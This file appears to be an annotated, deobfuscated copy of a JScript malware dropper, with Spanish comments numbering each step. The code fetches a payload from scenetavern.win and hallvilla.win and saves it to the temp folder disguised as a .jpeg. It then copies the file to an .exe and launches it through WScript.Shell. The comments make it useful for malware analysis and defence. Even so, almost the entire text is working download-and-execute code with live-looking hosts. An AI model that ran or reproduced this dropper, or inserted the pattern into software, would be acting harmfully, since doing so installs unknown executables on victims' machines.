/* 1 - PUNTO DE ENTRADA AL PROGRAMA*/
/* Se llama a la función UV y se le pasa por parámetro una función manejador.
 Esta funcion nos devuelve el malware descargado desde el servior y un booleano
 que nos dice si ha habido o no error. 

   4 - Se llama a la funcion KvgoaW pasandole el objeto descargado.
*/
entrada_Antes_UV(function(objetoXMLHTTPResponseBody, error) {
    if (!error) {
        creaYEscribeArchivo_Antes_KvgoaW(objetoXMLHTTPResponseBody, function(rutaArchivoCreado, error) {
            if (!error) {
                try {
                    KLFZ(rutaArchivoCreado);
                } catch (error) {}
            }
        });
    }
});

/* 2 - funcion que recoge las url con las que va a contactar el dropper*/
/* Contacta con la primera url, si devuelve status 200 llama a callback_Antes_deBJ
 pasandole la respuesta del get y false. Si el status != 200 prueba con la siguiente url.*/
function entrada_Antes_UV(callback_Antes_deBJ) {
    try {
        var url = 'http://scenetavern.win/support.php?f=1.dat';
        hacerPeticionGET_Antes_xba(url, function(objetoXMLHTTPResponseBody, respuestaBool) {
            //Si respuestaBool = False significa que la petición ha ido bien y se llama a callback_Antes_deBJ
            if (!respuestaBool) {
                return callback_Antes_deBJ(objetoXMLHTTPResponseBody, false);
            } else {
                var url2 = 'http://hallvilla.win/support.php?f=1.dat';
                hacerPeticionGET_Antes_xba(url2, function(objetoXMLHTTPResponseBody, respuestaBool) {
                    if (!respuestaBool) {
                        return callback_Antes_deBJ(objetoXMLHTTPResponseBody, false);
                    } else {
                        var url3 = 'http://hallvilla.win/support.php?f=1.dat';
                        hacerPeticionGET_Antes_xba(url3, function(objetoXMLHTTPResponseBody, respuestaBool) {
                            if (!respuestaBool) {
                                return callback_Antes_deBJ(objetoXMLHTTPResponseBody, false);
                            } else {
                                var url4 = 'http://hallvilla.win/support.php?f=1.dat';
                                hacerPeticionGET_Antes_xba(url4, function(objetoXMLHTTPResponseBody, respuestaBool) {
                                    if (!respuestaBool) {
                                        return callback_Antes_deBJ(objetoXMLHTTPResponseBody, false);
                                    } else {
                                        var url5 = 'http://hallvilla.win/support.php?f=1.dat';
                                        hacerPeticionGET_Antes_xba(url5, function(objetoXMLHTTPResponseBody, respuestaBool) {
                                            if (!respuestaBool) {
                                                return callback_Antes_deBJ(objetoXMLHTTPResponseBody, false);
                                            } else {
                                                return callback_Antes_deBJ(null, true); //Si devuelve true es que ha ido mal.
                                            }
                                        });
                                    }
                                });
                            }
                        });
                    }
                });
            }
        });
    } catch (error) {
        WScript.Echo(error);
        return callback_Antes_deBJ(null, true);
    }
}

/* 3 - Funcion a la que se le pasa la url para hacer la petición*/
/* En caso de que la peticion salga bien llama a la funcionCallback pasandole
 la respuesta y false. En cualquier otro caso le pasa null y un true
*/
function hacerPeticionGET_Antes_xba(urlEntrante, funcionCallback) {
    try {
        var objetoXMLHTTP = new ActiveXObject("MSXML2.XMLHTTP");
        objetoXMLHTTP.open('GET', urlEntrante, false);
        objetoXMLHTTP.send();
        if (objetoXMLHTTP.status == 200) { //Si el resultado es correcto se llama a callback con un false.
            return funcionCallback(objetoXMLHTTP.ResponseBody, false);
        } else { //Si el resultado NO es correcto se llama a callback con un true.
            return funcionCallback(null, true);
        }
    } catch (error) {  //Si no se ha podido ejecutar la petición se llama a callback con un true.
        return funcionCallback(null, true);
    }
}

/*  5 - función  KvgoaW*/
/*     Llama a la función qdwsFVTbp() para crear un archivo y obtener la ruta a dicho archivo  
    7 - Se llama a la función cT junto pasandole la respuestá del servidor y la ruta del 
        nuevo archivo
    9 - Se llama a callback_Antes_dispVF() con la ruta al archivo que ahora contiene la
        respuesta del servidor. callback_Antes_dispVF Llama a la función KLFZ pasandole 
        la ruta al archivo creado.
*/
function creaYEscribeArchivo_Antes_KvgoaW(objetoXMLHTTPResponseBody, callback_Antes_dispVF) {
    try {
        var rutaArchivo_Antes_YXai = crearArchivoEnCarpeta_Antes_qdwsFVTbp();
        if (rutaArchivo_Antes_YXai) {
            var error = escribirArchivo_Antes_cT(objetoXMLHTTPResponseBody, rutaArchivo_Antes_YXai);
            if (!error) {
                WScript.Echo('skKHvbVC');
            }
            return callback_Antes_dispVF(rutaArchivo_Antes_YXai, false);
        } else {
            return callback_Antes_dispVF(null, true);
        }
    } catch (error) {
        return callback_Antes_dispVF(null, true);
    }
}

/* 6 - función  qdwsFVTbp llamada desde KvgoaW*/
/* Crea un manejador de archivos en el sistema. Ademas
 crea un archivo de nombre aleatorio con extensión .jpeg  
 Devuelve la ruta a una carpeta especial del sistema.
 */
function crearArchivoEnCarpeta_Antes_qdwsFVTbp() {
    try {
        var objetoFileSystemObject = new ActiveXObject('Scripting.FileSystemObject');
        var stringAleatorio_Antes_OSD = Math.random().toString(36); // Crea un string aleatorio del estilo: "0.5ll6h8fqs5o"
        var nombreArchivo_Antes_wime = stringAleatorio_Antes_OSD.substr(2, 9) + ".jpeg"; // crea un nombre para un archivo jpeg del estilo:
        var rutaArchivo_Antes_EGqWqhgSpd = "\\" + nombreArchivo_Antes_wime;             // del estilo: 5ll6h8fqs5o.jpeg
        var rutaCarpeta_Antes_IrFXRl = objetoFileSystemObject.GetSpecialFolder(2) + rutaArchivo_Antes_EGqWqhgSpd;
        return rutaCarpeta_Antes_IrFXRl;
    } catch (error) {
        return false;
    }
}

/* 8 - Funcion cT */
/*  Recibe la respuesta del servidor y la ruta al archivo creado
    Crea un objeto Stream para escribir la respuesta del servidor
    en el archivo recientemente creado.
    */
function escribirArchivo_Antes_cT(objetoXMLHTTPResponseBody, rutaArchivo_Antes_YXai) {
    var objetoStream = new ActiveXObject('ADODB.Stream');
    objetoStream.Open();
    objetoStream.Type = 1; 
    objetoStream.Write(objetoXMLHTTPResponseBody);
    objetoStream.Position = 0;
    objetoStream.SaveToFile(rutaArchivo_Antes_YXai, 2);
    objetoStream.Close();
    return true;
}

/* 10 - Funcion KLFZ*/
/*  Recibe la ruta al archivo creado.
    Escoge un elemento del array y según lo que sea hace una cosa u otra*/
function KLFZ(rutaArchivoCreado) {
    var elementoArray = elementoRandomArray_Antes_XjeKDZgGZf(['return ds', 'sdfd', 'new ActiveXObject("WScript.Shell")']);
    var contador = 0;

    function yVgesNA() {
        bifurcaPrograma_Antes_XjXSc(rutaArchivoCreado, elementoArray);
        contador++;
        if (contador > 100007) {
            // Solo se entra desde la traza B
            cambiarExtensionArchivo_Antes_WPWHF(rutaArchivoCreado, function(rutaArchivoCreadoExe) {
                ejecutaMalware_Antes_wf(rutaArchivoCreadoExe)
            });
            return true;
        }
        return false;
    }
    var resultadoXjXSc = bifurcaPrograma_Antes_XjXSc(rutaArchivoCreado, elementoArray);
    var i = 0;
    // Traza A - Ejecuta yVgesNA -> XjXSc y acaba
    // Traza B - Ejecuta yVgesNA 100007 veces y a la 100008 -> cambiarExtensionArchivo_Antes_WPWHF y yVgesNA
    do {  
        i = resultadoXjXSc;
        var resultado_yVgesNA = yVgesNA();
        if (resultado_yVgesNA) {
            break;
        }
    } while (i < 1);
}

/* 11 - Función  XjeKDZgGZf*/
/* Escoge y devuelve al azar un elemento del array: 
   ['return ds', 'sdfd', 'new ActiveXObject("WScript.Shell")']*/
function elementoRandomArray_Antes_XjeKDZgGZf(array) {
    return array[Math.floor((Math.random() * array.length))];
}

/* 12 - Función XjXSc*/
/*  El programa se bifurca en dos trazas.
    12_A - El elemento del Array es 'new ActiveXObject("WScript.Shell")' ejecuta WPWHF
        con callback ejecutaMalware_Antes_BO y devuelve 1. 
    12_B - No entra en la condición y devuelve 0 */
function bifurcaPrograma_Antes_XjXSc(rutaArchivoCreado, elementoArray) {
    var varDevolver = 0;
    for (var i = 0; i < 10; i++) {
        var stringAux = elementoArray;
        if (~stringAux.indexOf('cript')) { 
            varDevolver = 1;
            cambiarExtensionArchivo_Antes_WPWHF(rutaArchivoCreado, function(rutaArchivoCreadoExe) 
            {
                ejecutaMalware_Antes_BO(elementoArray, rutaArchivoCreadoExe);
            });
        }
    }
    return varDevolver;
}

/* 13_A - Funcion WPWHF
   13_B - Funcion WPWHF*/
/*  Recibe rutaArchivoCreado y callback que llamará a ejecutaMalware_Antes_BO
    Cambia la extensión del archivo creado de .jpeg a .exe      
*/
function cambiarExtensionArchivo_Antes_WPWHF(rutaArchivoCreado, callback_Antes_aiIWKbgoz) {
    try {
        var objetoFileSystemObject = new ActiveXObject('Scripting.FileSystemObject');
        var nuevaRuta = rutaArchivoCreado.replace('.jpeg', '.exe');
        objetoFileSystemObject.CopyFile(rutaArchivoCreado, nuevaRuta);
        return callback_Antes_aiIWKbgoz(nuevaRuta);
    } catch (e) {
        return null;
    }
}

/* 14_A - Función BO */
/*  Ejecuta el archivo .exe con el código descargado desde el servidor */
function ejecutaMalware_Antes_BO(elementoArray, rutaArchivoCreadoExe) {
    var objetoWScriptShell = elementoArray ;
    objetoWScriptShell.Run(rutaArchivoCreadoExe);
}

/* 14_B - Función wf */
/*  Crea un objeto WScript.Shell y ejecuta 
    el archivo .exe con el código descargado desde el servidor */
function ejecutaMalware_Antes_wf(rutaArchivoCreadoExe) {
    var stringShell = "WScript.Shell";
    var objetoWScriptShell = new ActiveXObject(stringShell);
    objetoWScriptShell.Run(rutaArchivoCreadoExe);
}






